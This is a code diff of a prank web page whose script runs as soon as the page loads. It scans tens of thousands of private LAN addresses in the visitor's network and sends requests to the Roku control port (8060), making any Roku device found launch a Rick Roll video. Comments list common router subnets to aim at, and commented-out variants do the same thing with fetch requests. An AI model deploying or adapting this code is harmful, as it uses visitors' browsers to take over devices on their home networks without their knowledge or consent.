@@ -1,7 +1,7 @@
 <html>
 	<head>
 		<title>get rolled lmao</title>
-<style>
+		<style>
 div {
 	text-align: center;
 }
@@ -9,7 +9,7 @@ body {
 	color: #bbbbbb;
 	background-color:#121212;
 }
-</style>
+		</style>
 	</head>
 
 
@@ -27,26 +27,149 @@ body {
 		- 172.16.0.0/12
 		- 192.168.0.0/16
 		- 10.0.0.0/8
-		*/
-		function roll(ip) {
-			fetch(`http://${ip}:8060/launch/837?contentID=dQw4w9WgXcQ`,{method:'POST'});
-		}
 
-		for (let i=0; i<=255; i++) {
-			for (let j=0; j<=255; j++) {
-				roll(`192.168.${i}.${j}`);
+		most common 192.168.<number> subnets: (src: https://routersecurity.org/ipaddresses.php)
+		0, 1, 2, 3 (used by Amped Wireless, Huawei and many others)
+		4 (used by Zoom and eero)
+		5 (used by Hawking)
+		7 (used by Eero)
+		8 (used by GL.iNet and Huawei)
+		9 (used by Gryphon)
+		10 (used by Motorola,MSI,pcWRT,TRENDnet,NetComm)
+		11 (used by Buffalo)
+		15 (used by D-Link, Linksys and Vonage)
+		16 (used by Linksys)
+		19 (used by Anonabox)
+		20 (used by Motorola,NetComm)
+		30 (used by Motorola)
+		50 (used by Peplink)
+		55 (used by Luma)
+		62 (used by Motorola)
+		72 (used by Asus Lyra)
+		85 and 86 (used by Google)
+		88 (used by MikroTik)
+		100 (used by assorted cable modems and Huawei)
+		102 (used by Motorola)
+		121 (used by the Ubiquiti Alien router)
+		123 (used by LevelOne, Sitecom, Comfast)
+		127 (used by Mercku)
+		168 (used by Sonicwall)
+		178 (used by AVM FRITZ!Box)
+		179 (used by AVM FRITZ!Box Guest network)
+		218 (used by Firewalla)
+		223 (used by Trendnet)
+		254 (used by D-Link, Actiontec)
+
+		and then I would add (if not already) just round numbers like 5, 10, 15, 25, 50, 75, 100, 125, 150, 175, 200, 225, 250, 255, 254
+		then prob also .88 .69 .42
+
+		same src:
+If you prefer IP addresses starting with 10, then the subnets to avoid are
+		10.0.0.x (Netgear, Asus, Cisco, Rogers Ignite, 2Wire, etc)
+		10.0.1.x (Apple)
+		10.1.1.x (Belkin, D-Link)
+		10.1.10.x (SMC)
+		10.10.1.x (Asus)
+		10.10.10.x (HooToo in their HT-TM05 TripMate Titan Wi-Fi sharing device)
+		10.90.90.x (D-Link)
+
+		I'd add 10.0.0, 10.1.1, 10.0.1, 10.1.0, 10.10.10, 10.20.30, etc
+		 */
+
+
+		function sendToRoku(ip) {
+			const img = new Image();
+			img.src = `http://${ip}:8060/launch/837?contentID=dQw4w9WgXcQ`;
+			// No response needed. It'll send or it won't. We don't care.
+		}
+	
+		function runMassScan() {
+			for (let i = 0; i <= 52; i++) {
+				for (let j = 0; j <= 255; j++) {
+					setTimeout(() => {
+						sendToRoku(`192.168.${i}.${j}`);
+					}, (i * 256 + j) * 100); // stagger to avoid locking up the browser
+				}
 			}
 		}
+	
+		runMassScan();
 
-		for (let i=0; i<=255; i++) {
-			roll(`10.0.0.${i}`);
-			roll(`10.0.1.${i}`);
-			roll(`10.1.1.${i}`);
-		}
 
-		for (let i=0; i<=255; i++) {
-			roll(`172.16.0.${i}`);
-			roll(`172.16.1.${i}`);
-		}
+
+
+
+
+
+
+		// const fetchTimeout = (url, ms, { signal, method = 'POST' } = {}) => {
+		// 	const controller = new AbortController();
+		// 	const promise = fetch(url, { signal: controller.signal, method });
+		// 	if (signal) signal.addEventListener("abort", () => controller.abort());
+		// 	const timeout = setTimeout(() => controller.abort(), ms);
+		// 	return promise.finally(() => clearTimeout(timeout));
+		// };
+
+		// const controller = new AbortController();
+		// const { signal } = controller;
+
+		// async function roll(ip) {
+		// 	// Start the fetch request but do not await it
+		// 	fetchTimeout(`http://${ip}:8060/launch/837?contentID=dQw4w9WgXcQ`, 1, { signal });
+		// }
+
+		// async function runRolls() {
+		// 	for (let i = 0; i <= 2; i++) {
+		// 		for (let j = 0; j <= 255; j++) {
+		// 			roll(`192.168.${i}.${j}`);
+		// 		}
+		// 		// Abort all requests after a short delay
+		// 		setTimeout(() => {
+		// 			controller.abort();
+		// 		}, 5000); // Adjust the delay as needed
+		// 	}
+		// }
+
+		// runRolls();
+
+
+
+
+
+		// const fetchTimeout = (url, ms, { signal, method = 'POST'  } = {}) => { // shamelessly stolen from https://stackoverflow.com/a/57888548
+		// 	const controller = new AbortController();
+		// 	const promise = fetch(url, { signal: controller.signal, ...options });
+		// 	if (signal) signal.addEventListener("abort", () => controller.abort());
+		// 	const timeout = setTimeout(() => controller.abort(), ms);
+		// 	controller.abort();
+		// 	return promise.finally(() => clearTimeout(timeout));
+		// };
+
+		// const controller = new AbortController();
+		// const { signal } = controller;
+
+		// function roll(ip) {
+		// 	const response = await fetchTimeout(`http://${ip}:8060/launch/837?contentID=dQw4w9WgXcQ`, 1, { signal });
+		// 	controller.abort();
+		// }
+
+		// for (let i=0; i<=2; i++) {
+		// 	for (let j=0; j<=255; j++) {
+		// 		roll(`192.168.${i}.${j}`);
+		// 	}
+		// }
+
+		// /*
+		// for (let i=0; i<=255; i++) {
+		// 	roll(`10.0.0.${i}`);
+		// 	roll(`10.0.1.${i}`);
+		// 	roll(`10.1.1.${i}`);
+		// }
+
+		// for (let i=0; i<=255; i++) {
+		// 	roll(`172.16.0.${i}`);
+		// 	roll(`172.16.1.${i}`);
+		// }
+		//  */
 	</script>
 </html>
